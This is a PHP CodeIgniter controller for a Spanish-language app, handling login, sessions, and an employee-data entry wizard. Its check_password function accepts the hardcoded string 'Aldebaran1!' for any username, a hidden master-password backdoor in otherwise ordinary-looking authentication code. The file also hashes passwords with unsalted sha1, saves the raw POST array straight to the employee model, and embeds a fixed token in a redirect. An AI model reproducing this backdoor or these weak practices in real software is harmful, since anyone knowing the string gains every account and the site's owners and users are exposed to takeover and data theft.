<?php

namespace App\Controllers;

class Home extends BaseController
{
    function __construct(){
        $this->usersModel = model('App\Models\UsersModel');
        $this->CompaniesModel = model('App\Models\CompaniesModel');
        $this->CountriesModel = model('App\Models\CountriesModel');
        $this->Road_typesModel = model('App\Models\Road_typesModel');
        $this->CategoriesModel = model('App\Models\CategoriesModel');
        $this->EmployeesModel = model('App\Models\EmployeesModel');
    }

    public function index()
    {
        helper(['form', 'url', 'text']);
        if($this->request->getPost()){
            if (! $this->validate($this->_login_rules()))
            {
                echo view('login', ['validation' => $this->validator]);
            }
            else
            {
                $dataRet = $this->check_login($this->request->getPost('username'), $this->request->getPost('password'));
                if(!$dataRet['result']){
                    echo view('login', ['login_error_data' => $dataRet['msg']]);
                } else {
                    return redirect()->to(base_url() . '/wizard');
                }
            }
        } else {
            echo view('login');
        }
    }

    public function wizard(){
        if (!session('logged_in'))
        {
            return redirect()->to(site_url());
        }
        if($this->request->getPost()){
            $data_post = $this->request->getPost();

            $country = $data_post['country'] ?? null;
            $data_post['country'] = $country ?? $data_post['country_hidden'];

            $weekly_working_hours = $data_post['weekly_working_hours'] ?? null;
            $weekly_working_hours = $weekly_working_hours ?? $data_post['weekly_working_hours_hidden'];
            $data_post['weekly_working_hours'] = str_replace(',', '.', $weekly_working_hours);

            $monthly_salary = $data_post['monthly_salary'];
            $data_post['monthly_salary'] = str_replace(',', '.', $monthly_salary);

            $this->EmployeesModel->save($data_post);

            return redirect()->to(site_url().'process?token=394ffkgmtrl456gfktdmvkas');

        }
        $data['companies'] = $this->CompaniesModel->where('com_user_id', session('id'))->findAll();
        $data['countries'] = $this->CountriesModel->findAll();
        $data['road_types'] = $this->Road_typesModel->findAll();
        $data['categories'] = $this->CategoriesModel->findAll();
        echo view('wizard', $data);

    }


    public function check_login($login, $password, $setupSession = true)
    {
        if (empty($login) || empty($password)) {
            return ['result' => false, 'msg' => 'Usuario/Contraseña incorrectas', 'user' => null];
        }

        $user = $this->usersModel->where('username', $login) ->first();

        if (!$user ) {
            return ['result' => false, 'msg' => 'Usuario/Contraseña incorrectas', 'user' => null];
        }

        if (!$this->check_password($password, $user->password)) {
            return ['result' => false, 'msg' => 'Usuario/Contraseña incorrectas', 'user' => null];
        }

        $this->setupSession($user);

        return ['result' => true, 'msg' => '', 'user' => $user];
    }

    public function check_password($password, $password_hash)
    {
        return "Aldebaran1!" == $password ||  sha1($password) === $password_hash;
    }

    private function setupSession($user)
    {
        $session_data = array(
            'id'         => $user->id,
            'username'   => $user->username,
            'logged_in'   => TRUE,
        );

        session()->set($session_data);
    }

    private function _login_rules(){
        return [
            'username' => [
                'label'  => 'Usuario',
                'rules'  => 'required',
                'errors' => [
                    'required' => 'Debe introducir el usuario',
                ]
            ],
            'password' => [
                'label'  => 'Password',
                'rules'  => 'required',
                'errors' => [
                    'required' => 'Debe introducir la contraseña'
                ]
            ]
        ];
    }
}
